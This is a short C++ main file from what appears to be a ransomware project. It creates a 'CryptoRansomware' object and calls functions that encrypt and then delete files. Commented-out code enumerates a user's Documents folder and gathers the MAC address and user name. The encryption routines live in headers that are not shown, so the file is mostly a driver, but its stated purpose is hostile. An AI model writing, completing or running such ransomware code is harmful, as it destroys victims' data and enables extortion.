/*#include <iostream>
#include <filesystem>
#include <string>
#include <windows.h>
#include <cstdlib>
#include <iterator>
#include <fstream>

#include "InfoSeeker.h"
#include "Encrypter.h"


namespace fs = std::filesystem;
*/
#include "CryptoRansomware.h"

int main() {
	
	CryptoRansomware cr = CryptoRansomware();
	cr.encryptFiles();
	cr.deleteFiles();
	/*
	std::string path = "C:\\Users\\52551\\Documents\\";
	for (const auto& entry : fs::recursive_directory_iterator(path)) {
		if (entry.is_regular_file()) {
			std::cout << entry.path() << std::endl;
		}
	}
	

	
	InfoSeeker infsr = InfoSeeker();
	char* pMac = infsr.getMAC();
	std::cout << infsr.getMacAddress() << std::endl;
	std::cout << infsr.getUserName();

	Encrypter cipher = Encrypter();

	cipher.encrypt( "abc.jpg", "abc_encrypted");
	cipher.decrypt( "abc_encrypted", "abc_decrypted.jpg");
	*/
	system("pause");
	//free(pMac);
	return 0;
}